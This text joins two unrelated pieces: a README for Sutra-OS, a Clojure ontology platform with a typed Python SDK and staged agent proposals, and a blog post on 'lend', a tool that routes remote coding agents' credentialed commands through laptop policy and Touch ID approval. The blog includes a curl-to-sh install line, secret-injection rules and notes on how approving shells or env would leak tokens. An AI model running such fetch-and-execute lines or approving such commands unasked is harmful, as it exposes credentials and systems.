You can always ask first. "Would this work?" is the same question, without the last step. An agent can only make suggestions. What it hands back is the note, never the change. You decide. You can try things out. Run the same decisions on a copy, compare, and keep the real one untouched. You can look back. Every approved change is kept, so last Tuesday's state is still there to read. The answer is the same everywhere. The rule is checked in one place, so the phone, the script and the agent hear the same no.

And it is not a promise. A test fails if the part that decides ever does anything but decide.

Your data comes in as it is. Mail over IMAP, CSV exports, REST APIs, PostgreSQL, MySQL, SQL Server and SSH, shaped by transforms in Python, SQL or Clojure.

Every number has a past. Lineage runs from each object back through the transforms and datasets to the mail, statement or row it came from (sutra lineage <node>). When someone else's figures disagree with yours, you open the source.

Agents get only the tools you name. An action, a function, a query on one type. By default (:writes :propose) their changes are staged as proposals; a rejected one doesn't come back, and the model's prompt and answer are kept with the run.

The model is versioned like code. Model and data live on branches. You stage a change, commit it, open a proposal, see who consumes what you touched, and merge into main only when it's reviewed. Webhooks and notifications stay silent on a branch unless you say otherwise.

Share exactly what you choose. Markings on types and properties are mandatory access control; grants on projects decide who may read, act and invoke. A group (a co-op, a tenants' association, a family) can pool what its members agree to share, and nothing else, and the server enforces it on every read: lists, filters, counts and totals. One person's data can't show what everyone else was offered. A group's can.

Builders and users are different people. One person writes the model; everyone else gets apps with the build tools locked away, and a server that says no when no is the right answer.

Secrets stay out of reach. A separate egress agent holds every external credential, so the code that reads your mail never sees the password.

You described the farm once. Generate a Python SDK from it, and your code speaks the farm's language: lots, harvests and buyers, and the things you are allowed to do with them, not tables and joins.

pip install ./clients/python-platform-sdk sutra-platform-sdk generate --base-url http://127.0.0.1:<port> \ --username admin --password "…" --out farm_sdk.py

farm_sdk.py is plain, typed Python: a class per object type, an attribute per property and link, a method per action with the action's parameters as its signature. Sutra's language server (clients/ent-lsp) runs pyright for Python and labels each completion as what it is in the model (property, link-type, action, state); any editor that lets you pick the language server can run it (Neovim config).

An action is a method. Its signature comes from the model; a missing argument is flagged before anything runs.

lot = Lot.get("North Meadow, 1st cut 2025") lot.sell_hay(bales=20, buyer="Neighbour") # error: Argument missing for parameter "sale_nr" lot.sell_hay(bales=20, buyer="Neighbour", sale_nr="S-2026-010") # ok

States are types. A harvest's status is Literal['planted', 'harvested', 'delivered', 'paid'], so the editor offers exactly those four.

for h in Field.get("hilltop").harvests: if h.status == "planted": # completes: planted, harvested, delivered, paid h.record_harvest(harvested_on=date(2027, 7, 28), tonnes=61.5)

Filters are checked too. Comparing bales with a string, or reading a link that may be empty, fails in the editor, not on the farm.

Lot.where(Lot.in_barn < "forty") # error: Operator "<" not supported for types # "Property[int]" and "Literal['forty']" Lot.where(Lot.in_barn < 50) # ok lot.field.margin # error: "margin" is not a known attribute of "None" if lot.field: lot.field.margin # ok The walkthrough in code: objects with their links, acting, asking first, proposing, lifecycles, server-side aggregates, sets, branches and revisions from sutra_platform_sdk import SutraClient, sum_, avg, count, by, bucket from farm_sdk import Lot, Sale, Field, Buyer, register_all client = register_all(SutraClient("http://127.0.0.1:<port>", username="admin", password="…"))

An object, not a row. A lot brings its derived values and its links along. Nobody stored in_barn; the server computes it.

lot = Lot.get("North Meadow, 1st cut 2025") # a Lot, or NotFound lot.baled, lot.sold, lot.in_barn # (120, 95, 25) lot.field # <Field 'North Meadow'>: the field it was cut from [(s.buyer, s.bales) for s in lot.sales] # its three sales, each a Sale

Act on it. Selling hay is something you do to a lot. The server checks the rule, writes the sale, stamps your name on it and tells you what changed.

lot.sell_hay(sale_nr="S-2026-010", buyer="Neighbour", bales=20, price_per_bale=4.50) Lot.get(lot.name).in_barn # 5

Ask first, or only propose. The same call can be a question (nothing is written) or a proposal (staged until someone approves it). That is how an agent gets to use it.

from sutra_platform_sdk.actions import ActionConfig, ActionMode ask = ActionConfig(mode=ActionMode.VALIDATE_ONLY) lot.sell_hay(sale_nr="S-2026-011", buyer="Neighbour", bales=40, action_config=ask).validation.submission_criteria # ('Not that many bales in the barn.',) lot.sell_hay(sale_nr="S-2026-011", buyer="Neighbour", bales=5, publish=False).staged # True: a proposal, the barn is unchanged

Walk a lifecycle. A harvest goes from planted to harvested, delivered and paid, one action per step, and the rules travel with them. The states are declared in the model, so status is typed Literal['planted', 'harvested', 'delivered', 'paid'] and your editor offers exactly those four.

from datetime import date wheat = next(h for h in Field.get("hilltop").harvests if h.status == "planted") mill = Buyer.get("stone-mill") wheat.record_harvest(harvested_on=date(2027, 7, 28), tonnes=61.5) wheat.sell_harvest(buyer=mill, price_per_tonne=212) # ServerError: HTTP 422: No signed delivery note. Without one, the buyer decides later what you delivered. wheat.sell_harvest(buyer=mill, price_per_tonne=212, delivery_note=True, quality_tested=True) Buyer.get("stone-mill").unpaid # 13038: what the mill owes you, until … wheat.record_payment() Field.get("hilltop").margin # … the wheat lands in the field's margin

Ask the whole farm, in one line. Who bought how much hay, month by month, at what price. Grouped, summed and sorted on the server; nothing is downloaded to be counted.

Sale.aggregate( sum_(Sale.bales), avg(Sale.price_per_bale), count(), group_by=[bucket(Sale.sold_on, "month"), by(Sale.buyer)], order_by=sum_(Sale.bales), desc=True, ).flat() # [{'sold_on_month': '2025-12', 'buyer': 'Riding stables', 'bales_sum': 80, # 'price_per_bale_avg': Decimal('4.5000000000000000'), 'count': 2}, …]

Money stays Decimal all the way from the database; nothing is rounded through a float.

Sets, not lists. On the class, a property is a filter and a link is a hop. Combine sets with |, & and -; the server plans it, and you fetch only what you iterate. Each set knows what it holds: running_low is an ObjectSet[Lot], and one hop along Lot.sales makes it an ObjectSet[Sale].

running_low = Lot.where(Lot.in_barn < 50) neighbours = Sale.where(Sale.buyer == "Neighbour").around(Sale.lot) (running_low - neighbours).count() # 3: running low, and the neighbour never bought from them running_low.around(Lot.sales).aggregate(sum_(Sale.bales), group_by=[by(Sale.buyer)]) # who emptied them

Try tomorrow's rule on today's farm, or look at last Tuesday. Everything above runs unchanged against a branch, and every action tells you the revision it landed in, a state you can read again later.

with client.branch("new-rule"): # made with: sutra branch new-rule lot.sell_hay(sale_nr="S-2026-012", buyer="Neighbour", bales=5) # main never notices sale = lot.sell_hay(sale_nr="S-2026-013", buyer="Neighbour", bales=1) client.at(sale.revision).objects("sale") # the sales as they stood right then

And what it refuses. Wrong names, missing arguments and wrong types fail in your editor, before anything runs. Broken rules fail on the server, with the same sentence for every client. If the model changes underneath you, register_all refuses to run until you regenerate.

lot.sell_hay(bales=20, buyer="Neighbour") # error: Argument missing for parameter "sale_nr" lot.sell_hay(sale_nr="S-1", buyer="Neighbour", bales="20") # error: "Literal['20']" is not assignable to "int" Lot.where(Lot.in_barn < "about forty") # error: Operator "<" not supported for types # "Property[int]" and "Literal['about forty']" lot.field.margin # error: "margin" is not a known attribute of "None"

These are pyright's messages against the generated farm SDK. The SDK's tests run the same lines through pyright, against an SDK generated from a schema captured from a running server, not from a hand-written imitation of one.

None of this is a reporting layer bolted on afterwards. The UI, the CLI, the REST API and the agents ask the same questions and take the same actions through the same door, which is why an agent can be handed Lot and sell_hay and nothing else.

./bin/start.sh # backend + shadow-cljs watch; PostgreSQL from SUTRA_PG_URL ./bin/stop.sh (cd tests/frontend && npm install) # once: the browser tests' driver (playwright-core) bin/test # full suite; integration tiers start PostgreSQL in podman Path What lives there src/ the server libs/ libraries the server, the clients and the tests share: kernel (reference interpreter), world (the world as a db value), commits, service, dialect, core, lib (the .ent dialect as a library), calx, store, store-pg clients/ frontend, CLI, language server, Python SDK, and the babashka tools behind bin/change and bin/enta plugins/ optional modules (SSO, LLM, packages, …) boundaries/ the published interfaces, conformance kits and their register (resources/sutra/boundaries.edn), Apache-2.0 resources/ the .ent grammar and example models (presets), platform config, the web client's static files distributions/ ready-to-run bundles (sutra-solo) tests/ backend suites, the scenario, and tests/frontend bin/ start, stop, test and tooling scripts

The semantics are pinned by an executable scenario, an aircraft maintenance shop in tests/scenario: "no release while a defect is open" is the barn rule above in another world.

Security: set SUTRA_HTTP_BIND when running the plain server (it defaults to 0.0.0.0). ./bin/start.sh allows anonymous access, so never expose it. Transforms run user code on the server, so grant that right accordingly.

Maintainers wanted. Sutra-OS needs people who will take responsibility for part of it over time: the server, the web client, the Python SDK, connectors, packaging and installation, docs, or the example models. You don't need to know all of it. Start with a few contributions in one area; if you'd like to stay, say so in an issue.

The most useful contributions are not always code:

A model for an everyday problem. A tenancy, a pension, a medical bill, a small association's membership. If a rule protects someone, it belongs in resources/presets. Plain-language guides for the person who sets Sutra up for others. Translations. Parts of the code base and the examples are in German; the user interface should speak more languages than two. Code. Send a failing test or a fix.

Open an issue for questions, ideas and bug reports. Be kind: the person on the other side may be the one this was built for.

The code is offered as is, in the spirit of Rich Hickey's Open Source is Not About You: nobody is owed a feature, a fix or an answer, and that includes the maintainers. What keeps it going is people choosing to help.

The ontology model of objects, links and actions follows the one popularised by Palantir Foundry; Sutra-OS was built from its public documentation. The web client is built on Palantir's Blueprint UI toolkit (Apache-2.0), vendored as a ClojureScript port in clients/frontend/vendor/blueprint-cljs. The implementation owes everything to Rich Hickey and Clojure, and to his almost spiritual talk Are We There Yet?, which will perhaps continue to transform the software craft into eternity. Claude Code wrote all of the code.

entry.content:
Running coding agents without handing them my credentials Table of Contents

I built lend to let remote agents use tools on my laptop with my approval. Here's how it fits into my workflow.

 Background #

I use agents heavily these days as part of my toolchain. I usually have a few going at once: Claude Code working in one repo, Codex reviewing a branch in another, and something long-running in the background. I often have them review each other's work too. None of them run on my laptop. They run on VMs I can throw away, and my laptop keeps the stuff I care about: my SSH keys, my 1Password vault, and the gh and cloud CLIs that are logged in as me.

This works great until an agent needs one of those things. In this post I'll go over how I run agents in parallel with herdr and Ovis, and the tool I wrote to deal with credentials, lend.

herdr #

herdr is a terminal multiplexer built for coding agents. You get the usual workspaces, tabs, and panes, and it also knows which agent is running in each pane and what it's doing. The sidebar shows whether each agent is working, waiting on me, or done, so I can tell at a glance which one needs attention.

The CLI talks to the running session, so agents can drive each other. An agent can start Codex in another pane, give it a prompt, wait for it to finish, and read what it said:

1herdr agent start reviewer --kind codex --pane "$PANE" 2herdr agent prompt reviewer "Review the diff on am/fix-retries" --wait --until done 3herdr agent read reviewer --source recent

Remote hosts work the same way. herdr machine add agent-vm sets up herdr on the VM and adds its sessions to my local client. Those sessions keep running after I disconnect.

Ovis #

Ovis is a browser and phone client for herdr. It shows each agent's transcript as a chat, with the live terminal a tap away. When an agent asks for approval or has a question, Ovis turns it into a card I can answer and sends me a push notification. It picks up the machines saved in herdr, so my VMs show up without any extra setup. I reach it over Tailscale.

If an agent gets stuck on a question while I'm away from my desk, I answer it from my phone and the other agents keep going.

The credential problem #

Agents on a VM still need to act as me. I use them to monitor CI with gh, call APIs with tokens from 1Password, and SSH into other hosts. There are two usual ways to make that work, and I don't love either of them.

The first is copying credentials onto the VM. A token in ~/.config/gh/hosts.yml can be read by every process on that machine, including the agent and anything it runs, for as long as the token is valid.

The second is forwarding my SSH agent with ssh -A. The private keys stay on my laptop, but the VM can use every key in the agent without asking and without any record of what it signed. It also only covers SSH keys.

What I wanted was for the credentials to stay on the laptop and for the commands that need them to run there too. The agent asks to run something, I approve it with Touch ID, and the agent gets the output back.

lend #

That's where lend comes in. lend is a proxy that sits in front of your existing SSH agent, and you forward its socket in place of the real one. SSH and Git keep working like normal, and lend adds a way to run commands through an SSH agent extension.

When an agent on the VM asks to run gh, the request goes over the socket and gh runs on my laptop with my login. The token never leaves the laptop, so the agent never has it. Every request, whether it's a signature or a command, is checked against a policy on the laptop and needs my approval before anything happens.

1Remote: lend exec -- command args 2 | 3 forwarded SSH agent socket 4 | 5Laptop: lend agent -> policy + local approval -> local command 6 -> original SSH agent (signing)

The policy lives on the laptop and lists what the VM is allowed to ask for. Everything else is denied. Mine is pretty short:

1{ 2 "default": "deny", 3 "commands": [ 4 {"executable": "/opt/homebrew/bin/gh", "approval": "biometric:inline"} 5 ], 6 "ssh": { 7 "default": "deny", 8 "keys": [ 9 {"fingerprint": "SHA256:...", "approval": "biometric:inline"} 10 ] 11 } 12}

A rule can also take an args_prefix like ["pr", "view"] if you only want to allow some subcommands. biometric:inline puts Touch ID right in the request dialog, so I read the request and touch once to approve it. Plain biometric asks for Touch ID in a second prompt after I click Allow.

To connect, I run lend ssh from the laptop. It starts a proxy for that one connection and stops it when SSH exits:

1lend ssh --config ./policy.json -- agent-vm

I run herdr on the VM. Claude Code talks to lend through lend mcp, an MCP server with a single tool called run_local_command. The tool takes the command to run and a reason, and the reason is required:

1{ 2 "mcpServers": { 3 "laptop": {"command": "lend", "args": ["mcp"]} 4 } 5}

Here I asked Claude Code on the VM for the lend repo's description. It called the tool with gh repo view, my Mac showed the request, and one touch approved it:

The dialog shows the full path to the executable, every argument, the directory it'll run in on the laptop, the reason, and what the remote process said about itself. Once I approve, gh runs on the laptop and stdout, stderr, and the exit code stream back to the agent. The reason and caller details come from the VM, so they're marked as unverified. They're there to help me decide and can't change what the policy allows.

If you'd rather skip MCP, the same request works as a plain CLI call on the VM:

1lend exec --reason "Read the repo description" -- gh repo view antoniomika/lend Keeping the socket stable across reconnects #

herdr panes survive an SSH disconnect, but the forwarded socket belongs to that connection. When I reconnect, SSH gives me a new socket path. Agents still running in the panes keep the old SSH_AUTH_SOCK.

I use a symlink at a fixed path and update it from ~/.ssh/rc on the VM. SSH runs this before starting the shell, so it sees the socket forwarded by the new connection:

1#!/bin/sh 2 3if [ -n "${SSH_AUTH_SOCK:-}" ] && 4 [ "$SSH_AUTH_SOCK" != "$HOME/.ssh/lend/agent.sock" ] && 5 "$HOME/.local/bin/lend" doctor --remote --socket "$SSH_AUTH_SOCK" --timeout 1s >/dev/null 2>&1; then 6 install -d -m 700 "$HOME/.ssh/lend" && 7 ln -sfn -- "$SSH_AUTH_SOCK" "$HOME/.ssh/lend/agent.sock" 8fi 9 10if [ -n "${DISPLAY:-}" ] && read -r _ssh_proto _ssh_cookie; then 11 case $DISPLAY in 12 localhost:*) _ssh_display="unix:${DISPLAY#localhost:}" ;; 13 *) _ssh_display=$DISPLAY ;; 14 esac 15 printf 'add %s %s %s\n' "$_ssh_display" "$_ssh_proto" "$_ssh_cookie" | /usr/bin/xauth -q - 16fi

The check confirms the forwarded socket speaks lend before updating the link. The directory is private to my user and keeps this link separate from other agent sockets. I use lend's absolute path because this runs before my shell adds ~/.local/bin to PATH. The X11 block handles cookie setup, which SSH delegates to this file when it exists.

My ~/.bashrc checks the stable path before exporting it:

1if [ -S "$HOME/.ssh/lend/agent.sock" ] && 2 "$HOME/.local/bin/lend" doctor --remote --socket "$HOME/.ssh/lend/agent.sock" --timeout 1s >/dev/null 2>&1; then 3 export SSH_AUTH_SOCK="$HOME/.ssh/lend/agent.sock" 4fi

New Bash shells in herdr panes pick up the stable path when it works. If the check fails, Bash leaves SSH_AUTH_SOCK alone. MCP, approval hooks, and Git inherit that path when I start them. After reconnecting, the SSH hook updates the symlink and those processes use the new socket for subsequent requests. Agents already running with an old socket path need to be restarted once with the stable path in their environment.

The SSH connection from the laptop still has to stay open. Requests fail while it's disconnected, and reconnecting starts a new lend session with fresh approvals and leases. The link points at one connection at a time, so the last update wins.

Secrets the agent never sees #

gh works because it's already logged in on my laptop. Some tools need a token passed in. For those, a command rule can read secrets with something like op read and hand them to the approved command as environment variables:

1{ 2 "secret_reader": "/opt/homebrew/bin/op", 3 "secret_reader_args": ["read", "--no-newline"], 4 "commands": [ 5 { 6 "executable": "/opt/homebrew/bin/gh", 7 "args_prefix": ["pr", "view"], 8 "approval": "biometric", 9 "secrets": {"GH_TOKEN": "op://Development/github/token"} 10 } 11 ] 12}

When the agent asks to run gh pr view and I approve it, lend reads the token from 1Password, runs gh with GH_TOKEN set, and sends back the output. The token stays on the laptop. The VM can't pick which variables get set or which references get read. The prompt shows the variable names and references, and the values never show up in prompts or history.

Here's the VM running gh api user with a rule that injects GH_TOKEN. After I approve in lend, 1Password asks for its own Touch ID before op read returns the token. The VM gets my login back, and its own environment has no GH_TOKEN:

There's one catch: this only works if the approved command doesn't print its environment. If you approve env or sh, you've handed the values right back. The same goes for allowing op itself as a command, since op read prints the secret and that output goes straight to the agent.

SSH keys #

Keys get their own policy too. Keys that aren't listed are hidden from the VM, and listed keys can be limited by what they're allowed to sign. max_signatures caps how many signatures a key can make in a session.

Leases #

A rule can offer a lease when I approve, like five minutes or three uses. Leases only exist inside a lend ssh session and only match the exact command and arguments I approved. They go away when the session ends or my screen locks.

Seeing what happened #

lend status --all --watch shows what's connected, what's waiting, what's running, and any active leases. lend pause --all cancels everything and refuses new requests until I resume. lend history keeps a record of what ran and how it was approved. It leaves out arguments, output, and secrets, and you can opt into logging arguments.

Answering agent prompts from the laptop #

Agents also ask permission for things that have nothing to do with my credentials, like running a shell command on the VM, editing a file, or fetching a URL. lend approve sends those questions to the same dialog on my Mac. It doesn't run anything on the laptop. It asks me, and the agent decides what to do with the answer.

For Claude Code, it's a PermissionRequest hook on the VM:

1{ 2 "hooks": { 3 "PermissionRequest": [ 4 {"matcher": "*", "hooks": [{"type": "command", "command": "lend approve --hook claude-code"}]} 5 ] 6 } 7}

Now when Claude Code would normally stop and ask in the terminal, my Mac shows the command or tool input and I answer with Touch ID. The laptop policy lists which topics are allowed to ask, each with its own approval:

1"approvals": { 2 "topics": [{"name": "claude-code", "approval": "biometric:inline"}] 3}

There are adapters for Codex, Antigravity, and pi, plus a plain JSON format for anything else. You can use it in scripts too: lend approve --topic deploy --title "terraform apply" && terraform apply only applies after I approve on the laptop. If the laptop can't be reached, the hook stays out of the way and the agent asks in its own UI like it normally would.

What lend doesn't protect against #

An approved command runs as my user and can touch my files. Approval decides what runs, and lend doesn't sandbox it. If I approve a shell, an interpreter, or anything that reads instructions from stdin, I've basically approved running anything on my laptop, since stdin streams after approval and isn't shown in the prompt.

The caller details in the prompt come from the VM and can be faked. Anyone who can reach the forwarded socket on the VM, root included, can make requests while the session is open. The policy still limits what they can ask for, and every request still needs my approval.

lend is still early and runs on macOS and Linux. It doesn't allocate a PTY, so interactive programs won't work through it. On Linux, approval is a Zenity dialog or a terminal prompt, and biometric approval is macOS only.

Prior art #

ssh-rev-exec sends local execution requests through an SSH agent proxy, and op-forward forwards 1Password CLI commands to a machine with desktop authentication. lend is a separate implementation that uses the same agent extension trick and adds per-request policy, local approval, and key filtering.

Trying it #

Install lend on both your laptop and the remote host:

1brew install antoniomika/tap/lend 2# or 3curl -fsSL https://github.com/antoniomika/lend/releases/latest/download/install.sh | sh

Run lend doctor on the laptop to check your policy, executables, upstream agent, and approval setup. lend doctor --remote on the VM checks that the forwarded socket is actually lend. The getting started guide walks through a first session, and the docs cover policies, approval, and MCP. If you give it a try, I'd love to hear how it goes on GitHub.
